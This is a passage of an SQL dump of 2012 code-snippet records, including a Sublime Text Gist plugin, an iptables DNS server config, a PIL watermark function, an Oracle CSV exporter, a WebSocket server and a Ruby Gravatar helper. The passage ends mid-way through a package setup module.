	('915739e13fe04fd3bded36d73e663fd2', 'None', 'sublime text gist plugin', 'pyer', 'jamiesun@talkincode.org', 'python,gist,python,sublime text 2', 'import sublime\nimport sublime_plugin\nimport os\nimport sys\nimport json\nimport base64\nimport urllib2\nimport subprocess\nimport functools\nimport webbrowser\nimport tempfile\nimport traceback\nimport contextlib\nimport shutil\n\nDEFAULT_CREATE_PUBLIC_VALUE = \'false\'\nDEFAULT_USE_PROXY_VALUE = \'false\'\nsettings = sublime.load_settings(\'Gist.sublime-settings\')\nGISTS_URL = \'https://api.github.com/gists\'\n\nclass MissingCredentialsException(Exception):\n    pass\n\nclass CurlNotFoundException(Exception):\n    pass\n\nclass SimpleHTTPError(Exception):\n    def __init__(self, code, response):\n        self.code = code\n        self.response = response\n\ndef get_credentials():\n    username = settings.get(\'username\')\n    password = settings.get(\'password\')\n    if not username or not password:\n        raise MissingCredentialsException()\n    return (username, password)\n\ndef basic_auth_string():\n    auth_string = u\'%s:%s\' % get_credentials()\n    return auth_string.encode(\'utf-8\')\n\nif sublime.platform() == \'osx\':\n    # Keychain support\n    # Instead of Gist.sublime-settings, fetch username and password from the user\'s github.com keychain entry\n    SERVER = \'github.com\'\n\n    def create_keychain_accessor():\n        from ctypes import cdll, util, c_uint32, c_int, c_char_p, c_void_p, POINTER, pointer, byref, Structure, string_at\n        lib_security = cdll.LoadLibrary(util.find_library(\'Security\'))\n\n        class SecKeychainAttributeInfo(Structure):\n            _fields_ = [("count", c_uint32), ("tag", POINTER(c_uint32)), ("format", POINTER(c_uint32))]\n\n        class SecKeychainAttribute(Structure):\n            _fields_ = [("tag", c_uint32), ("length", c_uint32), ("data", c_void_p)]\n\n        class SecKeychainAttributeList(Structure):\n            _fields_ = [("count", c_uint32), ("attr", POINTER(SecKeychainAttribute))]\n\n        PtrSecKeychainAttributeList = POINTER(SecKeychainAttributeList)\n\n        def keychain_get_credentials():\n            username = settings.get(\'username\')\n            password = settings.get(\'password\')\n            if username and password:\n                return (username, password)\n\n            password_buflen = c_uint32()\n            password_buf = c_void_p()\n            item = c_void_p()\n\n            error = lib_security.SecKeychainFindInternetPassword(\n               None, # keychain, NULL = default\n               c_uint32(len(SERVER)), # server name length\n               c_char_p(SERVER),      # server name\n               c_uint32(0), # security domain - unused\n               None,        # security domain - unused\n               c_uint32(0 if not username else len(username)), # account name length\n               None if not username else c_char_p(username),   # account name\n               c_uint32(0), # path name length - unused\n               None,        # path name\n               c_uint32(0), # port, 0 = any\n               c_int(0), # kSecProtocolTypeAny\n               c_int(0), # kSecAuthenticationTypeAny\n               None, # returned password length - unused\n               None, # returned password data - unused\n               byref(item)) # returned keychain item reference\n            if not error:\n                info = SecKeychainAttributeInfo(\n                    1, # attribute count\n                    pointer(c_uint32(1633903476)), # kSecAccountItemAttr\n                    pointer(c_uint32(6))) # CSSM_DB_ATTRIBUTE_FORMAT_BLOB\n\n                attrlist_ptr = PtrSecKeychainAttributeList()\n                error = lib_security.SecKeychainItemCopyAttributesAndData(\n                    item, # keychain item reference\n                    byref(info), # list of attributes to retrieve\n                    None, # returned item class - unused\n                    byref(attrlist_ptr), # returned attribute data\n                    byref(password_buflen), # returned password length\n                    byref(password_buf)) # returned password data\n\n                if not error:\n                    try:\n                        if attrlist_ptr.contents.count == 1:\n                            attr = attrlist_ptr.contents.attr.contents\n                            username = string_at(attr.data, attr.length)\n                            password = string_at(password_buf.value, password_buflen.value)\n                    finally:\n                        lib_security.SecKeychainItemFreeAttributesAndData(attrlist_ptr, password_buf)\n\n            if not username or not password:\n                raise MissingCredentialsException()\n            else:\n                return (username, password)\n\n        return keychain_get_credentials\n    get_credentials = create_keychain_accessor()\n\ndef catch_errors(fn):\n    @functools.wraps(fn)\n    def _fn(*args, **kwargs):\n        try:\n            return fn(*args, **kwargs)\n        except MissingCredentialsException:\n            sublime.error_message("Gist: GitHub username or password isn\'t provided in Gist.sublime-settings file")\n            user_settings_path = os.path.join(sublime.packages_path(), \'User\', \'Gist.sublime-settings\')\n            if not os.path.exists(user_settings_path):\n                default_settings_path = os.path.join(sublime.packages_path(), \'Gist\', \'Gist.sublime-settings\')\n                shutil.copy(default_settings_path, user_settings_path)\n            sublime.active_window().open_file(user_settings_path)\n        except subprocess.CalledProcessError as err:\n            sublime.error_message("Gist: Error while contacting GitHub: cURL returned %d" % err.returncode)\n        except EnvironmentError as err:\n            traceback.print_exc()\n            if type(err) == OSError and err.errno == 2 and api_request == api_request_curl:\n                sublime.error_message("Gist: Unable to find Python SSL module or cURL")\n            else:\n                msg = "Gist: Error while contacting GitHub"\n                if err.strerror:\n                    msg += err.strerror\n                sublime.error_message(msg)\n        except SimpleHTTPError as err:\n            msg = "Gist: GitHub returned error %d" % err.code\n            try:\n                response_json = json.loads(err.response)\n                response_msg = response_json.get(\'message\')\n                if response_msg:\n                    msg += ": " + response_msg\n            except ValueError:\n                pass\n            sublime.error_message(msg)\n        except:\n            traceback.print_exc()\n            sublime.error_message("Gist: unknown error (please, report a bug!)")\n    return _fn\n\ndef create_gist(public, description, files):\n    file_data = dict((filename, {\'content\': text}) for filename, text in files.items())\n    data = json.dumps({\'description\': description, \'public\': public, \'files\': file_data})\n    gist = api_request(GISTS_URL, data)\n    return gist\n\ndef update_gist(gist_url, file_changes, new_description=None):\n    request = {\'files\': file_changes}\n    if new_description is not None:\n        request[\'description\'] = new_description\n    data = json.dumps(request)\n    result = api_request(gist_url, data, method="PATCH")\n    return result\n\ndef gistify_view(view, gist, gist_filename):\n    statusline_string = "Gist: " + gist_title(gist)\n\n    if not view.file_name():\n        view.set_name(gist_filename)\n    elif os.path.basename(view.file_name()) != gist_filename:\n        statusline_string = "%s (%s)" % (statusline_string, gist_filename)\n\n    view.settings().set(\'gist_html_url\', gist["html_url"])\n    view.settings().set(\'gist_description\', gist[\'description\'])\n    view.settings().set(\'gist_url\', gist["url"])\n    view.settings().set(\'gist_filename\', gist_filename)\n    view.set_status("Gist", statusline_string)\n\ndef ungistify_view(view):\n    view.settings().erase(\'gist_html_url\')\n    view.settings().erase(\'gist_description\')\n    view.settings().erase(\'gist_url\')\n    view.settings().erase(\'gist_filename\')\n    view.erase_status("Gist")\n\ndef open_gist(gist_url):\n    gist = api_request(gist_url)\n    files = sorted(gist[\'files\'].keys())\n    for gist_filename in files:\n        view = sublime.active_window().new_file()\n\n        gistify_view(view, gist, gist_filename)\n\n        edit = view.begin_edit()\n        view.insert(edit, 0, gist[\'files\'][gist_filename][\'content\'])\n        view.end_edit(edit)\n\ndef get_gists():\n    return api_request(GISTS_URL)\n\ndef gist_title(gist):\n    return gist.get(\'description\') or gist.get(\'id\')\n\ndef api_request_native(url, data=None, method=None):\n    request = urllib2.Request(url)\n    if method:\n        request.get_method = lambda: method\n    request.add_header(\'Authorization\', \'Basic \' + base64.urlsafe_b64encode(basic_auth_string()))\n    request.add_header(\'Accept\', \'application/json\')\n    request.add_header(\'Content-Type\', \'application/json\')\n\n    if data is not None:\n        request.add_data(data)\n\n    if settings.get(\'https_proxy\'):\n        opener = urllib2.build_opener(urllib2.HTTPHandler(), urllib2.HTTPSHandler(),\n                                      urllib2.ProxyHandler({\'https\': settings.get(\'https_proxy\')}))\n\n        urllib2.install_opener(opener)\n\n    try:\n        with contextlib.closing(urllib2.urlopen(request)) as response:\n            if response.code == 204: # No Content\n                return None\n            else:\n                return json.loads(response.read())\n    except urllib2.HTTPError as err:\n        with contextlib.closing(err):\n            raise SimpleHTTPError(err.code, err.read())\n\n@contextlib.contextmanager\ndef named_tempfile():\n    tmpfile = tempfile.NamedTemporaryFile(delete=False)\n    try:\n        yield tmpfile\n    finally:\n        tmpfile.close()\n        os.unlink(tmpfile.name)\n\ndef api_request_curl(url, data=None, method=None):\n    command = ["curl", \'-K\', \'-\', url]\n\n    config = [\'-u \' + basic_auth_string(),\n              \'--header "Accept: application/json"\',\n              \'--header "Content-Type: application/json"\',\n              "--silent"]\n\n    if method:\n        config.append(\'--request "%s"\' % method)\n\n    if settings.get(\'https_proxy\'):\n        config.append(settings.get(\'https_proxy\'))\n\n    with named_tempfile() as header_output_file:\n        config.append(\'--dump-header "%s"\' % header_output_file.name)\n        header_output_file.close()\n        with named_tempfile() as data_file:\n            if data is not None:\n                data_file.write(data)\n                data_file.close()\n                config.append(\'--data-binary "@%s"\' % data_file.name)\n\n            process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n            response, _ = process.communicate(\'\\n\'.join(config))\n            returncode = process.returncode\n\n            if returncode != 0:\n                raise subprocess.CalledProcessError(returncode, \'curl\')\n\n            with open(header_output_file.name, "r") as headers:\n                _, responsecode, message = headers.readline().split(None, 2)\n                responsecode = int(responsecode)\n\n                if responsecode == 204: # No Content\n                    return None\n                elif 200 <= responsecode < 300:\n                    return json.loads(response)\n                else:\n                    raise SimpleHTTPError(responsecode, response)\n\napi_request = api_request_curl if (\'ssl\' not in sys.modules and os.name != \'nt\') else api_request_native\n\nclass GistCommand(sublime_plugin.TextCommand):\n    public = True\n\n    def mode(self):\n        return "Public" if self.public else "Private"\n\n    @catch_errors\n    def run(self, edit):\n        get_credentials()\n        regions = [region for region in self.view.sel() if not region.empty()]\n\n        if len(regions) == 0:\n            regions = [sublime.Region(0, self.view.size())]\n            gistify = True\n        else:\n            gistify = False\n\n        region_data = [self.view.substr(region) for region in regions]\n\n        window = self.view.window()\n\n        def on_gist_description(description):\n            filename = os.path.basename(self.view.file_name() if self.view.file_name() else \'\')\n\n            @catch_errors\n            def on_gist_filename(filename):\n                # We need to figure out the filenames. Right now, the following logic is used:\n                #   If there\'s only 1 selection, just pass whatever the user typed to Github. It\'ll rename empty files for us.\n                #   If there are multiple selections and user entered a filename, rename the files from foo.js to\n                #       foo (1).js, foo (2).js, etc.\n                #   If there are multiple selections and user didn\'t enter anything, post the files as\n                #       $SyntaxName 1, $SyntaxName 2, etc.\n                if len(region_data) == 1:\n                    gist_data = {filename: region_data[0]}\n                else:\n                    if filename:\n                        (namepart, extpart) = os.path.splitext(filename)\n                        make_filename = lambda num: "%s (%d)%s" % (namepart, num, extpart)\n                    else:\n                        syntax_name, _ = os.path.splitext(os.path.basename(self.view.settings().get(\'syntax\')))\n                        make_filename = lambda num: "%s %d" % (syntax_name, num)\n                    gist_data = dict((make_filename(idx), data) for idx, data in enumerate(region_data, 1))\n\n                gist = create_gist(self.public, description, gist_data)\n\n                gist_html_url = gist[\'html_url\']\n                sublime.set_clipboard(gist_html_url)\n                sublime.status_message("%s Gist: %s" % (self.mode(), gist_html_url))\n\n                if gistify:\n                    gistify_view(self.view, gist, gist[\'files\'].keys()[0])\n                else:\n                    open_gist(gist[\'url\'])\n\n            window.show_input_panel(\'Gist File Name: (optional):\', filename, on_gist_filename, None, None)\n\n        window.show_input_panel("Gist Description (optional):", \'\', on_gist_description, None, None)\n\nclass GistViewCommand(object):\n    """A base class for commands operating on a gistified view"""\n    def is_enabled(self):\n        return self.gist_url() is not None\n\n    def gist_url(self):\n        return self.view.settings().get("gist_url")\n\n    def gist_html_url(self):\n        return self.view.settings().get("gist_html_url")\n\n    def gist_filename(self):\n        return self.view.settings().get("gist_filename")\n\n    def gist_description(self):\n        return self.view.settings().get("gist_description")\n\nclass GistCopyUrl(GistViewCommand, sublime_plugin.TextCommand):\n    def run(self, edit):\n        sublime.set_clipboard(self.gist_html_url())\n\nclass GistOpenBrowser(GistViewCommand, sublime_plugin.TextCommand):\n    def run(self, edit):\n        webbrowser.open(self.gist_html_url())\n\nclass GistRenameFileCommand(GistViewCommand, sublime_plugin.TextCommand):\n    def run(self, edit):\n        old_filename = self.gist_filename()\n\n        @catch_errors\n        def on_filename(filename):\n            if filename and filename != old_filename:\n                text = self.view.substr(sublime.Region(0, self.view.size()))\n                file_changes = {old_filename: {\'filename\': filename, \'content\': text}}\n                new_gist = update_gist(self.gist_url(), file_changes)\n                gistify_view(self.view, new_gist, filename)\n                sublime.status_message(\'Gist file renamed\')\n\n        self.view.window().show_input_panel(\'New File Name:\', old_filename, on_filename, None, None)\n\nclass GistChangeDescriptionCommand(GistViewCommand, sublime_plugin.TextCommand):\n    def run(self, edit):\n        @catch_errors\n        def on_gist_description(description):\n            if description and description != self.gist_description():\n                gist_url = self.gist_url()\n                new_gist = update_gist(gist_url, {}, description)\n                for window in sublime.windows():\n                    for view in window.views():\n                        if view.settings().get(\'gist_url\') == gist_url:\n                            gistify_view(view, new_gist, view.settings().get(\'gist_filename\'))\n                sublime.status_message(\'Gist description changed\')\n\n        self.view.window().show_input_panel(\'New Description:\', self.gist_description() or \'\', on_gist_description, None, None)\n\nclass GistUpdateFileCommand(GistViewCommand, sublime_plugin.TextCommand):\n    @catch_errors\n    def run(self, edit):\n        text = self.view.substr(sublime.Region(0, self.view.size()))\n        changes = {self.gist_filename(): {\'content\': text}}\n        update_gist(self.gist_url(), changes)\n        sublime.status_message("Gist updated")\n\nclass GistDeleteFileCommand(GistViewCommand, sublime_plugin.TextCommand):\n    @catch_errors\n    def run(self, edit):\n        changes = {self.gist_filename(): None}\n        update_gist(self.gist_url(), changes)\n        ungistify_view(self.view)\n        sublime.status_message("Gist file deleted")\n\nclass GistDeleteCommand(GistViewCommand, sublime_plugin.TextCommand):\n    @catch_errors\n    def run(self, edit):\n        gist_url = self.gist_url()\n        api_request(gist_url, method=\'DELETE\')\n        for window in sublime.windows():\n            for view in window.views():\n                if view.settings().get("gist_url") == gist_url:\n                    ungistify_view(view)\n        sublime.status_message("Gist deleted")\n\nclass GistPrivateCommand(GistCommand):\n    public = False\n\nclass GistListCommandBase(object):\n    @catch_errors\n    def run(self, *args):\n        gists = get_gists()\n        gist_names = [gist_title(gist) for gist in gists]\n\n        def on_gist_num(num):\n            if num != -1:\n                self.handle_gist(gists[num])\n\n        self.get_window().show_quick_panel(gist_names, on_gist_num)\n\nclass GistListCommand(GistListCommandBase, sublime_plugin.WindowCommand):\n    @catch_errors\n    def handle_gist(self, gist):\n        open_gist(gist[\'url\'])\n\n    def get_window(self):\n        return self.window\n\nclass GistAddFileCommand(GistListCommandBase, sublime_plugin.TextCommand):\n    def is_enabled(self):\n        return self.view.settings().get(\'gist_url\') is None\n\n    def handle_gist(self, gist):\n        @catch_errors\n        def on_filename(filename):\n            if filename:\n                text = self.view.substr(sublime.Region(0, self.view.size()))\n                changes = {filename: {\'content\': text}}\n                new_gist = update_gist(gist[\'url\'], changes)\n                gistify_view(self.view, new_gist, filename)\n                sublime.status_message("File added to Gist")\n\n        filename = os.path.basename(self.view.file_name() if self.view.file_name() else \'\')\n        self.view.window().show_input_panel(\'File Name:\', filename, on_filename, None, None)\n\n    def get_window(self):\n        return self.view.window()\n', '4e84ce1b8a5247bb8a6179959438b55f', 'python', 'gist.py', 31, 6, '2012-07-14 13:28:12', 'sublime text 2'),
	('9a1ed448ec73429598dae4f959a1bade', 'None', 'bind9 server iptables dns服务器防火墙配置参考', 'pren', '6583805@qq.com', 'shell', '#@description:bind9 server iptables dns服务器防火墙配置参考\n#@tags:named,dns,dind9\n*filter\n:INPUT ACCEPT [0:0]\n:FORWARD ACCEPT [0:0]\n:OUTPUT ACCEPT [0:0]\n:RH-Firewall-1-INPUT - [0:0]\n-A INPUT -j RH-Firewall-1-INPUT\n-A FORWARD -j RH-Firewall-1-INPUT\n-A RH-Firewall-1-INPUT -i lo -j ACCEPT\n-A RH-Firewall-1-INPUT -p icmp --icmp-type any -j ACCEPT\n-A RH-Firewall-1-INPUT -p udp -m udp --dport 53 -j ACCEPT\n-A RH-Firewall-1-INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n-A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT\n-A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 53 -j ACCEPT\n-A RH-Firewall-1-INPUT -m tcp -p tcp --dport 80 -j ACCEPT\n-A RH-Firewall-1-INPUT -m tcp -p tcp --dport 443 -j ACCEPT\n-A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 5801  -j ACCEPT\n-A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 5901  -j ACCEPT\n-A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 6001  -j ACCEPT\n-A RH-Firewall-1-INPUT -j REJECT --reject-with icmp-host-prohibited\nCOMMIT', 'c93892ebe02e4ea1a5b06cab6d1e87ab', 'shell', 'iptables', 33, 8, '2012-07-11 19:57:21', 'sublime text 2'),
	('a3719b6c18544573b883400f4844e1e6', '0', 'python使用pil生成水印', 'Anonymous', 'Anonymous@talkincode.org', 'other', 'import Image, ImageEnhance\r\n\r\ndef reduce_opacity(im, opacity):\r\n    """Returns an image with reduced opacity."""\r\n    assert opacity >= 0 and opacity <= 1\r\n    if im.mode != \'RGBA\':\r\n        im = im.convert(\'RGBA\')\r\n    else:\r\n        im = im.copy()\r\n    alpha = im.split()[3]\r\n    alpha = ImageEnhance.Brightness(alpha).enhance(opacity)\r\n    im.putalpha(alpha)\r\n    return im\r\n\r\ndef watermark(im, mark, position, opacity=1):\r\n    """Adds a watermark to an image."""\r\n    if opacity < 1:\r\n        mark = reduce_opacity(mark, opacity)\r\n    if im.mode != \'RGBA\':\r\n        im = im.convert(\'RGBA\')\r\n    # create a transparent layer the size of the image and draw the\r\n    # watermark in that layer.\r\n    layer = Image.new(\'RGBA\', im.size, (0,0,0,0))\r\n    if position == \'tile\':\r\n        for y in range(0, im.size[1], mark.size[1]):\r\n            for x in range(0, im.size[0], mark.size[0]):\r\n                layer.paste(mark, (x, y))\r\n    elif position == \'scale\':\r\n        # scale, but preserve the aspect ratio\r\n        ratio = min(\r\n            float(im.size[0]) / mark.size[0], float(im.size[1]) / mark.size[1])\r\n        w = int(mark.size[0] * ratio)\r\n        h = int(mark.size[1] * ratio)\r\n        mark = mark.resize((w, h))\r\n        layer.paste(mark, ((im.size[0] - w) / 2, (im.size[1] - h) / 2))\r\n    else:\r\n        layer.paste(mark, position)\r\n    # composite the watermark with the layer\r\n    return Image.composite(layer, im, layer)\r\n\r\ndef test():\r\n    im = Image.open(\'test.png\')\r\n    mark = Image.open(\'overlay.png\')\r\n    watermark(im, mark, \'tile\', 0.5).show()\r\n    watermark(im, mark, \'scale\', 1.0).show()\r\n    watermark(im, mark, (100, 100), 0.5).show()\r\n\r\nif __name__ == \'__main__\':\r\n    test()', NULL, 'python', NULL, 45, 7, '2012-07-17 23:41:02', NULL),
	('ad4a38b7a72b4c5580495009fee61c22', 'None', '从oracle导出csv', 'piaoren', 'jamiesun@talkincode.org', 'python,database,csv,python', '#coding:utf-8\n\nimport sys\nimport cx_Oracle\nimport csv\n\nprint \'请输入要导出的数据库地址，格式:user/passwd@host:port/sid :\'.decode(\'utf-8\') \ndb =  len(sys.argv)>=2 and sys.argv[1] or  raw_input(\'Enter db(user/passwd@host:port/sid):\')     \n\nconnection = cx_Oracle.Connection(db)\ncursor = connection.cursor()\n\nsqls = {\n    "user":" select * from user"\n}\n\n#统计信息\nstatwriter = csv.writer(open("./stat.csv",\'wb\'),delimiter=\',\', quotechar=\'"\',quoting=csv.QUOTE_MINIMAL) \n\n\nfor name,sql in sqls.items():\n    writer = csv.writer(open("./%s.csv"%(name.decode(\'utf-8\')), "wb"),delimiter=\',\', quotechar=\'"\',quoting=csv.QUOTE_ALL) \n    cursor.execute(sql.decode(\'utf-8\'))\n\n    print "-"*80\n    print "export sql:%s"%sql.decode(\'utf-8\')\n    \n    writer.writerow([(hd[0] or \'\') for hd in cursor.description]) \n\n    stat = 0\n    for row in cursor:\n        writer.writerow([(rw or \'\') for rw in row])\n        stat += 1\n\n    statwriter.writerow([name,stat])     \n\ncursor.close()\nconnection.close()', '4e84ce1b8a5247bb8a6179959438b55f', 'python', 'export.py', 22, 7, '2012-07-17 09:32:16', 'sublime text 2'),
	('b070bd09e5bc4a86b381c9a8f956bd18', '0', 'python WebSockets 例子', 'Anonymous', 'Anonymous@talkincode.org', 'websocket', 'import time\r\nimport struct\r\nimport socket\r\nimport hashlib\r\nimport sys\r\nfrom select import select\r\nimport re\r\nimport logging\r\nfrom threading import Thread\r\nimport signal\r\n\r\nclass WebSocket(object):\r\n    handshake = (\r\n        "HTTP/1.1 101 Web Socket Protocol Handshake\\r\\n"\r\n        "Upgrade: WebSocket\\r\\n"\r\n        "Connection: Upgrade\\r\\n"\r\n        "WebSocket-Origin: %(origin)s\\r\\n"\r\n        "WebSocket-Location: ws://%(bind)s:%(port)s/\\r\\n"\r\n        "Sec-Websocket-Origin: %(origin)s\\r\\n"\r\n        "Sec-Websocket-Location: ws://%(bind)s:%(port)s/\\r\\n"\r\n        "\\r\\n"\r\n    )\r\n    def __init__(self, client, server):\r\n        self.client = client\r\n        self.server = server\r\n        self.handshaken = False\r\n        self.header = ""\r\n        self.data = ""\r\n\r\n    def feed(self, data):\r\n        if not self.handshaken:\r\n            self.header += data\r\n            if self.header.find(\'\\r\\n\\r\\n\') != -1:\r\n                parts = self.header.split(\'\\r\\n\\r\\n\', 1)\r\n                self.header = parts[0]\r\n                if self.dohandshake(self.header, parts[1]):\r\n                    logging.info("Handshake successful")\r\n                    self.handshaken = True\r\n        else:\r\n            self.data += data\r\n            msgs = self.data.split(\'\\xff\')\r\n            self.data = msgs.pop()\r\n            for msg in msgs:\r\n                if msg[0] == \'\\x00\':\r\n                    self.onmessage(msg[1:])\r\n\r\n    def dohandshake(self, header, key=None):\r\n        logging.debug("Begin handshake: %s" % header)\r\n        digitRe = re.compile(r\'[^0-9]\')\r\n        spacesRe = re.compile(r\'\\s\')\r\n        part_1 = part_2 = origin = None\r\n        for line in header.split(\'\\r\\n\')[1:]:\r\n            name, value = line.split(\': \', 1)\r\n            if name.lower() == "sec-websocket-key1":\r\n                key_number_1 = int(digitRe.sub(\'\', value))\r\n                spaces_1 = len(spacesRe.findall(value))\r\n                if spaces_1 == 0:\r\n                    return False\r\n                if key_number_1 % spaces_1 != 0:\r\n                    return False\r\n                part_1 = key_number_1 / spaces_1\r\n            elif name.lower() == "sec-websocket-key2":\r\n                key_number_2 = int(digitRe.sub(\'\', value))\r\n                spaces_2 = len(spacesRe.findall(value))\r\n                if spaces_2 == 0:\r\n                    return False\r\n                if key_number_2 % spaces_2 != 0:\r\n                    return False\r\n                part_2 = key_number_2 / spaces_2\r\n            elif name.lower() == "origin":\r\n                origin = value\r\n        if part_1 and part_2:\r\n            logging.debug("Using challenge + response")\r\n            challenge = struct.pack(\'!I\', part_1) + struct.pack(\'!I\', part_2) + key\r\n            response = hashlib.md5(challenge).digest()\r\n            handshake = WebSocket.handshake % {\r\n                \'origin\': origin,\r\n                \'port\': self.server.port,\r\n                \'bind\': self.server.bind\r\n            }\r\n            handshake += response\r\n        else:\r\n            logging.warning("Not using challenge + response")\r\n            handshake = WebSocket.handshake % {\r\n                \'origin\': origin,\r\n                \'port\': self.server.port,\r\n                \'bind\': self.server.bind\r\n            }\r\n        logging.debug("Sending handshake %s" % handshake)\r\n        self.client.send(handshake)\r\n        return True\r\n\r\n    def onmessage(self, data):\r\n        logging.info("Got message: %s" % data)\r\n\r\n    def send(self, data):\r\n        logging.info("Sent message: %s" % data)\r\n        self.client.send("\\x00%s\\xff" % data)\r\n\r\n    def close(self):\r\n        self.client.close()\r\n\r\nclass WebSocketServer(object):\r\n    def __init__(self, bind, port, cls):\r\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n        self.socket.bind((bind, port))\r\n        self.bind = bind\r\n        self.port = port\r\n        self.cls = cls\r\n        self.connections = {}\r\n        self.listeners = [self.socket]\r\n\r\n    def listen(self, backlog=5):\r\n        self.socket.listen(backlog)\r\n        logging.info("Listening on %s" % self.port)\r\n        self.running = True\r\n        while self.running:\r\n            rList, wList, xList = select(self.listeners, [], self.listeners, 1)\r\n            for ready in rList:\r\n                if ready == self.socket:\r\n                    logging.debug("New client connection")\r\n                    client, address = self.socket.accept()\r\n                    fileno = client.fileno()\r\n                    self.listeners.append(fileno)\r\n                    self.connections[fileno] = self.cls(client, self)\r\n                else:\r\n                    logging.debug("Client ready for reading %s" % ready)\r\n                    client = self.connections[ready].client\r\n                    data = client.recv(1024)\r\n                    fileno = client.fileno()\r\n                    if data:\r\n                        self.connections[fileno].feed(data)\r\n                    else:\r\n                        logging.debug("Closing client %s" % ready)\r\n                        self.connections[fileno].close()\r\n                        del self.connections[fileno]\r\n                        self.listeners.remove(ready)\r\n            for failed in xList:\r\n                if failed == self.socket:\r\n                    logging.error("Socket broke")\r\n                    for fileno, conn in self.connections:\r\n                        conn.close()\r\n                    self.running = False\r\n\r\nif __name__ == "__main__":\r\n    logging.basicConfig(level=logging.DEBUG, format="%(asctime)s - %(levelname)s - %(message)s")\r\n    server = WebSocketServer("localhost", 9999, WebSocket)\r\n    server_thread = Thread(target=server.listen, args=[5])\r\n    server_thread.start()\r\n    # Add SIGINT handler for killing the threads\r\n    def signal_handler(signal, frame):\r\n        logging.info("Caught Ctrl+C, shutting down...")\r\n        server.running = False\r\n        sys.exit()\r\n    signal.signal(signal.SIGINT, signal_handler)\r\n    while True:\r\n        time.sleep(100)', NULL, 'python', NULL, 11, 8, '2012-07-17 23:28:40', NULL),
	('b911782af62c4b19ac0f2643da681bdc', '0', '使用ruby获取gravatar.com头像', 'Anonymous', 'Anonymous@talkincode.org', 'other', 'def get_avatar size\r\n    if self.avatar.present?\r\n      self.avatar(size)\r\n    else  \r\n      if Rails.env == "production" && gravatar?(self.email.downcase, options = {}) \r\n        case size\r\n          when :thumb\r\n            sz = 28\r\n          when :medium\r\n            sz = 128\r\n          else \r\n            sz = 28\r\n        end    \r\n\r\n        gravatar_id = Digest::MD5.hexdigest(self.email.downcase)\r\n        "http://gravatar.com/avatar/#{gravatar_id}.png?s=#{sz}&d=#{CGI.escape(root_url(:only_path => true))}"\r\n      else\r\n        case size\r\n          when :thumb\r\n            root_path.to_s + "avatars/thumb.png"\r\n          when :medium\r\n            root_path.to_s + "avatars/middle.png"\r\n          else \r\n            root_path.to_s + "avatars/medium.png"\r\n        end\r\n      end\r\n    end  \r\n  end  \r\n\r\n  def gravatar?(email, options = {})\r\n    hash = Digest::MD5.hexdigest(email.to_s.downcase)\r\n    options = { :rating => \'x\', :timeout => 2 }.merge(options)\r\n    http = Net::HTTP.new(\'www.gravatar.com\', 80)\r\n    http.read_timeout = options[:timeout]\r\n    response = http.request_head("/avatar/#{hash}?rating=#{options[:rating]}&default=http://gravatar.com/avatar")\r\n    response.code != \'302\'\r\n  rescue StandardError, Timeout::Error\r\n    true  # Don\'t show "no gravatar" if the service is down or slow\r\n  end', NULL, 'ruby', NULL, 12, 7, '2012-07-17 22:40:23', NULL),
	('bf5ba597c3a346f59b889bcff3f2bbb0', 'None', 'sublime text 2 package setup module', 'pyer', 'jamiesun@talkincode.org', 'python,sublime text 2', '#!python\n#@tags:sublime text 2\nfrom __future__ import with_statement\nimport glob\nimport os.path\nimport shutil\nimport zipfile\n\n\ndef isFileEntry(s):\n	return s[-1] != \'/\'\n\ndef readFile(fname):\n	with open(fname, \'rb\') as f:\n		return f.read()\n\ndef writeFile(fname, data):\n	with open(fname, \'wb\') as fo:\n		fo.write(data)\n\ndef mkdirs(path):\n	try:\n		os.makedirs(path)\n	except os.error:\n		pass\n\ndef upgradeArchive(src, dst, pkgdir, backupdir, inhibitOverwrite):\n	mkdirs(pkgdir)\n	mkdirs(os.path.dirname(dst))\n\n	try:\n		newar = zipfile.ZipFile(src)\n	except (zipfile.BadZipfile):\n		print \'PackageSetup: bad zip file at %s\' % src\n		return\n	newfiles = set(filter(isFileEntry, newar.namelist()))\n\n	oldar = None\n	oldfiles = set()\n	try:\n		oldar = zipfile.ZipFile(dst)\n		oldfiles = set(filter(isFileEntry, oldar.namelist()))\n	except (zipfile.error, IOError):\n		pass\n\n	# delete any orphaned files\n	if not inhibitOverwrite:\n		orphanedFiles = oldfiles - newfiles\n		for f in orphanedFiles:\n			# backup the file, if the user has modified it\n			try:\n				orig = oldar.read(f)\n				user = readFile(os.path.join(pkgdir, f))\n				if user != orig:\n						backupFile = os.path.join(backupdir, f)\n						mkdirs(os.path.dirname(backupFile))\n						writeFile(backupFile, user)\n			except (os.error, IOError):\n				pass\n\n			try:\n				os.remove(os.path.join(pkgdir, f))\n			except (os.error, IOError):\n				pass\n\n	# extract any new files\n	for f in newfiles - oldfiles:\n		try:\n			if not isinstance(f, unicode):\n				f = unicode(f, \'utf-8\')\n			fname = os.path.join(pkgdir, f)\n		except (UnicodeDecodeError):\n			fname = os.path.join(pkgdir, unicode(f, \'cp1252\', \'replace\'))\n\n		mkdirs(os.path.dirname(fname))\n\n		try:\n			user = readFile(fname)\n			if user:\n				if inhibitOverwrite:\n					continue;\n				else:\n					# Backup the old file\n					backupFile = os.path.join(backupdir, f)\n					mkdirs(os.path.dirname(backupFile))\n					writeFile(backupFile, user)\n		except (os.error, IOError):\n			pass\n\n		writeFile(fname, newar.read(f))\n\n	# upgrade each file\n	if not inhibitOverwrite:\n		for f in oldfiles & newfiles:\n			fname = os.path.join(pkgdir, f)\n			orig = oldar.read(f)\n			new = newar.read(f)\n\n			if new != orig:\n				# backup the file, if the user has modified it\n				try:\n					user = readFile(fname)\n					if user != orig:\n						backupFile = os.path.join(backupdir, f)\n						mkdirs(os.path.dirname(backupFile))\n						writeFile(backupFile, user)\n				except (os.error, IOError):\n					pass\n\n				writeFile(fname, newar.read(f))\n\n	# copy the zip\n	shutil.copy(src, dst)\n\ndef removeArchive(dst, pkgdir):\n	oldar = None\n	oldfiles = set()\n	try:\n		oldar = 